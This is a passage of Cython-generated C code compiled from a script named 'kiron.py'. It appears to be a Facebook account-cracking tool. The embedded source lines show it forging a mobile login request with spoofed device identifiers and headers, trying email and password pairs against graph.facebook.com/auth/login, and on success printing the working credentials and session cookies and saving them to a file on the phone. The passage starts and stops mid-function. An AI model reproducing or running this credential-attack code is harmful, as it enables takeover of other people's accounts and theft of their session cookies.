        __pyx_t_4 = __pyx_pf_5kiron_4api1_genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 507, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__63, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 507, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_j1, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "kiron.py":508
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
 *                         jazoest = li2+j1             # <<<<<<<<<<<<<<
 *                         data = {
 *                                 'adid':adid,
 */
        __pyx_t_5 = PyNumber_Add(__pyx_v_li2, __pyx_v_j1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 508, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_jazoest, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":510
 *                         jazoest = li2+j1
 *                         data = {
 *                                 'adid':adid,             # <<<<<<<<<<<<<<
 *                                 'format':'json',
 *                                 'device_id':device_id,
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(25); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 510, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_adid, __pyx_v_adid) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_format, __pyx_n_s_json) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":512
 *                                 'adid':adid,
 *                                 'format':'json',
 *                                 'device_id':device_id,             # <<<<<<<<<<<<<<
 *                                 'email':ids,
 *                                 'password':pas,
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_device_id, __pyx_v_device_id) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":513
 *                                 'format':'json',
 *                                 'device_id':device_id,
 *                                 'email':ids,             # <<<<<<<<<<<<<<
 *                                 'password':pas,
 *                                 'generate_analytics_claims':'1',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_email, __pyx_v_ids) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":514
 *                                 'device_id':device_id,
 *                                 'email':ids,
 *                                 'password':pas,             # <<<<<<<<<<<<<<
 *                                 'generate_analytics_claims':'1',
 *                                 'community_id':'',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_password_2, __pyx_v_pas) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_analytics_claims, __pyx_kp_s_1) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_community_id, __pyx_kp_s__63) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_sim_country, __pyx_n_s_id) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_try_num, __pyx_kp_s_1) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":519
 *                                 "sim_country": "id",
 *                                 'try_num':'1',
 *                                 'family_device_id':family,             # <<<<<<<<<<<<<<
 *                                 'sim_serials':sim_serials,
 *                                 'credentials_type':'password',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_family_device_id, __pyx_v_family) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":520
 *                                 'try_num':'1',
 *                                 'family_device_id':family,
 *                                 'sim_serials':sim_serials,             # <<<<<<<<<<<<<<
 *                                 'credentials_type':'password',
 *                                 'source':'login',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_sim_serials, __pyx_v_sim_serials) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_credentials_type, __pyx_n_s_password_2) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_source, __pyx_n_s_login) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_error_detail_type, __pyx_n_s_button_with_disabled) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":524
 *                                 'source':'login',
 *                                 'error_detail_type':'button_with_disabled',
 *                                 'logged_out_id': str(uuid.uuid4()),             # <<<<<<<<<<<<<<
 *                                 'generate_session_cookies':'1',
 *                                 'generate_machine_id':'1',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_uuid); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_18, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 524, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 524, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_logged_out_id, __pyx_t_12) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_session_cookies, __pyx_kp_s_1) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_machine_id, __pyx_kp_s_1) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_tier, __pyx_n_s_regular) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":528
 *                                 'generate_machine_id':'1',
 *                                 'tier': 'regular',
 *                                 'reg_instance': str(uuid.uuid4()),             # <<<<<<<<<<<<<<
 *                                 'meta_inf_fbmeta':'',
 *                                 'currently_logged_in_userid':'0',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 528, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 528, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
          __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 528, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 528, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_reg_instance, __pyx_t_18) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_meta_inf_fbmeta, __pyx_kp_s__63) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_currently_logged_in_userid, __pyx_kp_s_0_2) < 0) __PYX_ERR(0, 510, __pyx_L3_error)

        /* "kiron.py":531
 *                                 'meta_inf_fbmeta':'',
 *                                 'currently_logged_in_userid':'0',
 *                                 'locale':fblc,             # <<<<<<<<<<<<<<
 *                                 'client_country_code':'',
 *                                 'fb_api_req_friendly_name':'authenticate',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_locale, __pyx_v_fblc) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_client_country_code, __pyx_kp_s__63) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_fb_api_req_friendly_name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_fb_api_caller_class, __pyx_kp_s_com_facebook_account_login_proto) < 0) __PYX_ERR(0, 510, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "kiron.py":537
 *                         }
 *                         headers={
 *                                 'Authorization':f'OAuth {accessToken}',             # <<<<<<<<<<<<<<
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_accessToken, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyUnicode_Concat(__pyx_kp_u_OAuth, __pyx_t_18); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_Authorization, __pyx_t_12) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Friendly_Name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 537, __pyx_L3_error)

        /* "kiron.py":539
 *                                 'Authorization':f'OAuth {accessToken}',
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 539, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 539, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__29, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 539, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 539, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Connection_Bandwidth, __pyx_t_18) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        /* "kiron.py":540
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 *                                 'User-Agent': AYYUB_M1(),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 540, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_randint); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 540, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__86, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 540, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_18); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 540, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Net_HNI, __pyx_t_12) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        /* "kiron.py":541
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),             # <<<<<<<<<<<<<<
 *                                 'User-Agent': AYYUB_M1(),
 *                                 'Accept-Encoding':'gzip, deflate',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__86, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_SIM_HNI, __pyx_t_18) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        /* "kiron.py":542
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 *                                 'User-Agent': AYYUB_M1(),             # <<<<<<<<<<<<<<
 *                                 'Accept-Encoding':'gzip, deflate',
 *                                 'Content-Type': 'application/x-www-form-urlencoded',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_AYYUB_M1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 542, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_4 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
          __pyx_t_18 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 542, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_User_Agent, __pyx_t_18) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Accept_Encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Content_Type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_HTTP_Engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 537, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "kiron.py":547
 *                                 'X-FB-HTTP-Engine': 'Liger'
 *                                 }
 *                         url = 'https://graph.facebook.com/auth/login'             # <<<<<<<<<<<<<<
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 */
        __Pyx_INCREF(__pyx_kp_s_https_graph_facebook_com_auth_lo);
        __Pyx_XDECREF_SET(__pyx_v_url, __pyx_kp_s_https_graph_facebook_com_auth_lo);

        /* "kiron.py":548
 *                                 }
 *                         url = 'https://graph.facebook.com/auth/login'
 *                         po = requests.post(url,data=data,headers=headers).json()             # <<<<<<<<<<<<<<
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_requests); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_post); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyTuple_New(1); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        if (__Pyx_PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_v_url)) __PYX_ERR(0, 548, __pyx_L3_error);
        __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_18, __pyx_t_4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 548, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_po, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":549
 *                         url = 'https://graph.facebook.com/auth/login'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 */
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_v_po, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 549, __pyx_L3_error)
        if (__pyx_t_23) {

          /* "kiron.py":550
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 */
          __pyx_t_5 = PyNumber_Add(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5_2, __pyx_v_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 550, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_u_38_5_244m_38_5_46m_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 550, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_pas); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 550, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 550, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 550, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "kiron.py":551
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])             # <<<<<<<<<<<<<<
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 */
          __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_session_cookies); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 551, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = __pyx_pf_5kiron_4api1_3genexpr(NULL, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 551, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__71, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 551, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_v_coki = ((PyObject*)__pyx_t_5);
          __pyx_t_5 = 0;

          /* "kiron.py":552
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M1-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 */
          __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 552, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_22 = 0;
          __pyx_t_8 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m);
          __pyx_t_8 = (1114111 > __pyx_t_8) ? 1114111 : __pyx_t_8;
          __pyx_t_22 += 40;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m);
          PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_38_5_244m_38_5_46m_38_5_244m);
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_A); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 552, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
